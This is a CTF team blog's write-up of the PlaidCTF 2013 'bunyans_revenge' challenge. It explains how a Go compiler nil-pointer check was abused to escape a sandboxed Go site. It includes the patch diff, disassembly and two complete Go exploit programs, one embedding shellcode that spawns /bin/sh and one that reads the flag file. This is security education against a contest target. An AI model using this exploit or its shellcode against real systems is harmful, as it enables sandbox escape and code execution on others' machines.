
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>PlaidCTF 2013 bunyans_revenge writeup - blue-lotus</title>
  <meta name="author" content="blue-lotus">

  
  <meta name="description" content="Overview The task is to get a shell on a sandboxed Go site, with help of a patch .Snippet below shows main part of the patch: diff -r a7414a294dcb &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.blue-lotus.net//plaidctf-2013-bunyans_revenge-writeup">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <div id="header-inner">
    <span class="first"><a href="/">blue-lotus</a></span>
    <span><a href="/about">about</a></span>
    <span class="last"><a href="/atom.xml" title="subscribe via RSS">rss</a></span>
  </div>
</hgroup>

</header>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">PlaidCTF 2013 Bunyans_revenge Writeup</h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-04-28T00:00:00+08:00" pubdate data-updated="true">Apr 28<span>th</span>, 2013</time>
        
      </p>
    
  </header>


<div class="entry-content"><h2 id="overview">Overview</h2>

<p>The task is to get a shell on a sandboxed Go <a href="http://50.17.64.205:8080/">site</a>, with help of a <a href="http://play.plaidctf.com/files/go.patch-ec4d1d0cd43f70526b2864d8ccae2e3db63fd7cc"> patch </a>.Snippet below shows main part of the patch:</p>

<pre>diff -r a7414a294dcb src/cmd/6g/cgen.c
--- a/src/cmd/6g/cgen.c Fri Apr 19 12:00:40 2013 -0700
+++ b/src/cmd/6g/cgen.c Fri Apr 19 21:03:47 2013 +0000
@@ -888,18 +888,18 @@
    
    case ODOTPTR:
        cgen(nl, res);
+       // explicit check for nil if struct is large enough
+       // that we might derive too big a pointer.
+       if(nl-&gt;type-&gt;type-&gt;width &gt;= unmappedzero) {
+           regalloc(&amp;n1, types[tptr], res);
+           gmove(res, &amp;n1);
+           n1.op = OINDREG;
+           n1.type = types[TUINT8];
+           n1.xoffset = 0;
+           gins(ATESTB, nodintconst(0), &amp;n1);
+           regfree(&amp;n1);
+       }
        if(n-&gt;xoffset != 0) {
-           // explicit check for nil if struct is large enough
-           // that we might derive too big a pointer.
-           if(nl-&gt;type-&gt;type-&gt;width &gt;= unmappedzero) {
-               regalloc(&amp;n1, types[tptr], res);
-               gmove(res, &amp;n1);
-               n1.op = OINDREG;
-               n1.type = types[TUINT8];
-               n1.xoffset = 0;
-               gins(ATESTB, nodintconst(0), &amp;n1);
-               regfree(&amp;n1);
-           }
            ginscon(optoas(OADD, types[tptr]), n-&gt;xoffset, res);
        }
        break;
</pre>

<p>It seems that he try to enforce the check related to nil, big struct, and pointer. This tell us that before patching we should be able to derive “too big a pointer” with help of nil and a large struct.</p>

<h2 id="unsafe-pointer">Unsafe pointer</h2>

<p>After some reading of the source code, we knew more about which type of code related to the patch.</p>

<pre>// src/cmd/gc/go.h, 478L
    ODOT,   // t.x
    ODOTPTR,    // p.x that is implicitly (*p).x
    ODOTMETH,   // t.Method

// src/cmd/6g/gsubr.c, 37L
// TODO(rsc): Can make this bigger if we move
// the text segment up higher in 6l for all GOOS.
vlong unmappedzero = 4096;
</pre>

<p>And we wrote snippets of code, which does fall in the old check, or bypass it (explicitly call the pointer)</p>

<pre>type T struct {
    offset [4096]byte
    x int
}

// fail:( 
var t *T
x := &amp;(t.x)
*x = 0
// ** panic msg while running **
panic: runtime error: invalid memory address or nil pointer dereference
[signal 0xb code=0x1 addr=0x0 pc=0x400c19]

// pass:)
var t *T
x := &amp;((*t).x)
*x = 0
// ** panic msg while running **
unexpected fault address 0x1000
throw: fault
[signal 0xb code=0x1 addr=0x1000 pc=0x400c1c]
</pre>

<h2 id="changing-code-flow">Changing code flow</h2>

<p>The sandbox doesn’t allow us to import packages containing unsafe parts, which make the compiler not compile in any unsafe runtime code, so we need to prepare the shellcode ourselves. Soon we found that function type in Go, like function pointer in C may help us. Due to NX bits, we need to put shellcode in executable areas. Using const string seems to be a good idea. Finally we worked out a piece of code running flawless in the local environment:</p>

<pre>package main
    
type T struct {
// magic numbers are from objdump:(
    offset [0x4283f8]byte
    x int64
}

type Func func(string)
var f Func

// execve('/bin/sh', ['/bin/sh'], NULL)
const shellcode = "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08" +
"\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

func main() {
    var t *T
    x := &amp;((*t).x)
    *x = 0x417c5c
    // avoiding unused const optimized out, not a real argument
    f(shellcode)
}
</pre>

<p>However it didn’t work on the site. First the memory layout seems not to be like that in our local environment, but we could pass it by fixing the offset in struct(we can “read” it from .text section online). Though calling shellcode fails still.</p>

<p>We noticed that panic message from the site differs from ours, which contains a file named “panic.c” not existing in our source code. It seems that they were using a different branch of Go. After searching we found this <a href="https://github.com/jnwhiteh/golang">repo</a> seems to fit theirs code well.</p>

<pre>goroutine 1 [running]:
[fp=0x7f8bbd3bbf60] runtime.throw(0x4420d7)
    /home/bunyansrevenge/go/src/pkg/runtime/panic.c:473 +0x67
[fp=0x7f8bbd3bbf78] runtime.sigpanic()
    /home/bunyansrevenge/go/src/pkg/runtime/os_linux.c:239 +0xe7
[fp=0x7f8bbd3bbf90] main.main()
    /tmp/go-sandbox728098232/prog.go:18 +0x20
</pre>

<p>Comparing binary compiled by these 2 branches, we saw the difference on handling function calling: modern ones just jump to the address stored in the memory, but the other storing the address in another location, and storing that address in the memory. See the disassembly for details:</p>

<pre># modern ones
400c37:       48 8b 1c 25 f8 83 42    mov    0x4283f8,%rbx
400c3e:       00 
400c3f:       ff d3                   callq  *%rbx

# the other
400c3d:       48 8b 14 25 10 41 44    mov    0x444110,%rdx
400c44:       00 
400c45:       48 8b 1a                mov    (%rdx),%rbx
400c48:       ff d3                   callq  *%rbx
</pre>

<p>So we need to change the code fitting compiler running on the site. At last it works. The complete piece of code for capturing the flag goes below:</p>

<pre>package main
    
type T struct {
    offset [0x444110]byte
    x *int64
}

type Func func(string)
var f Func
    
// execve('/usr/bin/cat', ['/usr/bin/cat', 'flag'], NULL)
const shellcode = "\x48\x31\xd2\x48\xc7\xc1\x66\x6c\x61\x67\x51\x48\x89\xe1" +
"\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe7\x48\x31\xc0\x50" +
"\x51\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
    
    
func main() {
    var _x int64
    _x = 0x42f5b0
    var t *T
    x := &amp;((*t).x)
    *x = &amp;_x
    // avoiding unused const optimized out, not a real argument
    f(shellcode)
}
</pre>

<p>The flag is <strong>nx_was_a_good_idea_after_all</strong>.</p>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">cbmixx</span></span>

      








  


<time datetime="2013-04-28T00:00:00+08:00" pubdate data-updated="true">Apr 28<span>th</span>, 2013</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/writeup/'>writeup</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/plaidctf-2013-crypto100-crypto-writeup/" title="Previous Post: PlaidCTF 2013 Crypto100 crypto writeup">&laquo; PlaidCTF 2013 Crypto100 crypto writeup</a>
      
      
        <a class="basic-alignment right" href="/plaidctf-2013-crypto-compression250-writeup/" title="Next Post: PlaidCTF 2013 Crypto compression(250)  writeup">PlaidCTF 2013 Crypto compression(250)  writeup &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/csaw-ctf-quals-2013-exp300-writeup/">CSAW CTF Quals 2013 Exploitation 300 Writeup</a>
      </li>
    
      <li class="post">
        <a href="/csaw-ctf-quals-2013-crypto500-writeup/">CSAW CTF Quals 2013 Crypto500 Writeup</a>
      </li>
    
      <li class="post">
        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
      </li>
    
      <li class="post">
        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - blue-lotus -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'bluelotus';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>











</body>
</html>
